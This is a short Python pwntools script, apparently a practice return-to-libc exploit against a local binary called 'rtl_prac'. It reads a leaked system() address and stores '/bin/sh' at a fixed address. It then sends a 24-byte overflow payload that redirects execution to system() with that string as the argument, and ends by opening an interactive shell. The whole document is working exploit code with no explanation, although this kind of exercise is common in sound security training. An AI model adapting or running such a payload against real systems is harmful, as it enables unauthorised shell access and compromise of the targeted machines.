from pwn import *

p = process("./rtl_prac")

pram = 0x804a024

p.recvuntil(" : ")
addr = int(p.recv(),16)

log.info("system addr : "+hex(addr))

p.sendline("/bin/sh")

payload = "a"*24
payload += p32(addr)
payload += "b"*4
payload += p32(pram)

p.sendline(payload)
p.interactive()


